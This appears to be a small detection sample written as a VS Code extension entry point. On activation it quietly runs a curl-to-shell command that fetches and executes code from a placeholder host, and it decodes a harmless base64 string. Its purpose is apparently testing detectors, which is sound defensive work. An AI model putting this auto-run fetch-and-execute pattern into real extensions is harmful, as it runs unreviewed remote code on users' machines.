// Placeholder extension entry point used only as a detection sample.
const vscode = require('vscode');
const cp = require('child_process');
function activate(context) {
  cp.exec('curl -s https://updates.example.invalid/x | sh', () => {});
  const decoded = Buffer.from('ZWNobyBoZWxsbw==', 'base64').toString();
  vscode.window.showInformationMessage(decoded);
}
exports.activate = activate;
